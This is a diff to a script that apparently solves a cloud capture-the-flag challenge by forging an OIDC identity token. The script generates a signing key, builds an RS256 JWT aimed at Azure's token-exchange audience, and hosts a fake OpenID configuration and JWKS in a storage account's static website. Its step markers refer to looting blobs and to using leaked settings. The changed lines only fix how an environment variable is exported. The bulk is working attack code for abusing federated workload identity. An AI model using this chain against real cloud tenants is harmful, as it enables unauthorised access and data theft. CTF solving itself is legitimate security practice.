@@ -60,7 +60,8 @@ open('/tmp/ctf_key.pem','wb').write(k.private_bytes(serialization.Encoding.PEM,s
 open('/tmp/ctf_jwks.json','w').write(json.dumps({'keys':[jwk]}))
 iss=os.environ['CTF_ISS']; now=int(time.time()); h=b64(json.dumps({'typ':'JWT','alg':'RS256','kid':'ctfchain'},separators=(',',':')).encode()); p=b64(json.dumps({'iss':iss,'sub':'solve:flag','aud':'api://AzureADTokenExchange','iat':now,'nbf':now-5,'exp':now+900},separators=(',',':')).encode()); raw=(h+'.'+p).encode(); print(raw.decode()+'.'+b64(k.sign(raw,padding.PKCS1v15(),hashes.SHA256())))
 PY
-    CTF_ISS="$ISS" JWT2=$(python3 /tmp/make_oidc.py)
+    export CTF_ISS="$ISS"
+    JWT2=$(python3 /tmp/make_oidc.py)
     printf '%s' "{\"issuer\":\"$ISS\",\"jwks_uri\":\"$ISS/jwks.json\",\"token_endpoint\":\"$ISS/token\",\"response_types_supported\":[\"id_token\"],\"subject_types_supported\":[\"public\"],\"id_token_signing_alg_values_supported\":[\"RS256\"]}" >/tmp/oidc.json
     az storage blob upload --account-name "$sa_name" --account-key "$key" --container-name '$web' --name ctf/.well-known/openid-configuration --file /tmp/oidc.json --content-type application/json --overwrite true -o none 2>/dev/null
     az storage blob upload --account-name "$sa_name" --account-key "$key" --container-name '$web' --name ctf/jwks.json --file /tmp/ctf_jwks.json --content-type application/json --overwrite true -o none 2>/dev/null
@@ -136,6 +137,7 @@ echo RETRY_MARK3=listkeys_body
 echo RETRY_MARK4=retry_exchange_and_storage
 echo RETRY_MARK5=target_loot_blobs
 echo RETRY_MARK6=federated_oidc_chain
+echo RETRY_MARK7=fix_oidc_env
 # Probe the two resources named by the leaked settings.  The custom ArmOwner
 # app-role is not understood by ARM itself, but is accepted by the challenge's
 # internal catalog/debug handlers; keep all response bodies in the Action log.
